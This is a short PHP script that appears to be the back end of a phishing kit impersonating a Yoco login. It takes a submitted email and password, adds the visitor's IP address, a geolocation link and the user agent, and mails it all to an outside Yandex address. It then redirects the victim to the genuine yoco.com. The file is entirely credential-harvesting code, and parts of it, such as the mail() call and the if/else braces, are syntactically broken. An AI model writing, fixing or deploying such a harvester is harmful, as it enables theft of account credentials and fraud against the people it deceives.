<?php
if($_POST['email'] != "" and $_POST['password'] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Yoco Info-----------------------\n";
$message .= "Yoco ID            : ".$_POST['email']."\n";
$message .= "Yoco Pass          : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Yoco --------------|\n";

		$to = "autowebmail@yandex.com";

$subject = "Card | $ip";
{
mail('$to', '$send', '$subject', $message', $header');     
}
$praga=rand($praga);
$praga=md5($praga);
  header ("Location: https://www.yoco.com");
else{
header ("Location: https://www.yoco.com");
}

?>